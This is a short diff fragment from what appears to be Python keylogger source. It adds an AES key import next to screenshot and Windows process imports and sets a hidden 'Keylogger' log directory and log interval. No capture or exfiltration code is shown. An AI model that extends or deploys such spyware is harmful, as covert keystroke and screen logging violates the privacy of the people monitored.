@@ -12,6 +12,7 @@ import win32gui
 import win32process
 import zipfile
 import pyscreenshot as ImageGrab
+from aes_key_generator import aes_key
 
 LOG_DIR = os.path.join(os.getenv("APPDATA") if os.name == "nt" else os.getenv("HOME"), "Keylogger")
 LOG_INTERVAL = 60  # Default log interval in seconds
